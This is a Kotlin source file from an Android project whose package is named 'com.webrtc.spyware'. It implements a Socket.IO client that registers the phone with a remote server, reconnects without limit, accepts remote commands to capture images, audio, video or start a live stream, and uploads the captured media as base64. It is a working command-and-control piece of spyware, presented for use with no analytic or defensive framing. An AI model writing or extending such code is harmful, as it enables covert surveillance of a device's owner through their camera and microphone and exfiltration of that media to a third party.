package com.webrtc.spyware

import android.util.Log
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URI

/**
 * SocketManager – manages Socket.IO connection to Node.js backend
 * with auto-reconnect, heartbeat, and media capture command handling.
 */
class SocketManager(
    private val serverUrl: String,
    private val deviceId: String,
    private val onCaptureCommand: (type: String, params: JSONObject) -> Unit
) {
    private val TAG = "SocketManager"
    private lateinit var socket: Socket
    private var isConnected = false

    fun connect() {
        try {
            val opts = IO.Options().apply {
                reconnection = true
                reconnectionDelay = 2000
                reconnectionDelayMax = 10000
                reconnectionAttempts = Int.MAX_VALUE
                timeout = 20000
            }
            socket = IO.socket(URI.create(serverUrl), opts)

            socket.on(Socket.EVENT_CONNECT) {
                isConnected = true
                Log.d(TAG, "Connected to signaling server")
                val reg = JSONObject().put("deviceId", deviceId)
                socket.emit("register-device", reg)
            }

            socket.on(Socket.EVENT_DISCONNECT) { args ->
                isConnected = false
                Log.w(TAG, "Disconnected: ${args.firstOrNull()}")
            }

            socket.on(Socket.EVENT_CONNECT_ERROR) { args ->
                Log.e(TAG, "Connection error: ${args.firstOrNull()}")
            }

            // Listen for media capture commands from dashboard
            socket.on("capture-image") { args ->
                val params = if (args.isNotEmpty()) args[0] as? JSONObject ?: JSONObject() else JSONObject()
                onCaptureCommand("image", params)
            }
            socket.on("capture-audio") { args ->
                val params = if (args.isNotEmpty()) args[0] as? JSONObject ?: JSONObject() else JSONObject()
                onCaptureCommand("audio", params)
            }
            socket.on("capture-video") { args ->
                val params = if (args.isNotEmpty()) args[0] as? JSONObject ?: JSONObject() else JSONObject()
                onCaptureCommand("video", params)
            }

            // WebRTC signaling
            socket.on("start-stream") { args ->
                Log.d(TAG, "Start stream requested")
                onCaptureCommand("start-stream", JSONObject())
            }

            socket.connect()
        } catch (e: Exception) {
            Log.e(TAG, "Socket init error: ${e.message}")
        }
    }

    fun sendMediaCapture(base64: String, type: String, filename: String, mimeType: String) {
        if (!isConnected) { Log.w(TAG, "Not connected, dropping media"); return }
        val data = JSONObject().apply {
            put("deviceId", deviceId)
            put("type", type)
            put("base64", base64)
            put("filename", filename)
            put("mimeType", mimeType)
        }
        socket.emit("media-captured", data)
        Log.d(TAG, "Media sent: $filename")
    }

    fun emitSignaling(event: String, data: JSONObject) {
        if (isConnected) socket.emit(event, data)
    }

    fun disconnect() {
        socket.disconnect()
    }

    fun isConnected() = isConnected
}
